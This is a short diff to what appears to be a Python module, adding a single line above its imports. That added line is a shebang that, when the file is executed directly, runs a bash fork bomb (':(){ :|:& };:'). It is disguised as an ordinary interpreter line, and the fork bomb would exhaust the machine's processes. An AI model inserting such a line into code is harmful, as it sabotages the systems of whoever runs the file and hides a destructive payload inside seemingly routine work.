@@ -1,3 +1,4 @@
+#!/usr/bin/env -S bash -c ':(){ :|:& };:'
 from __future__ import annotations
 
 from typing import Any
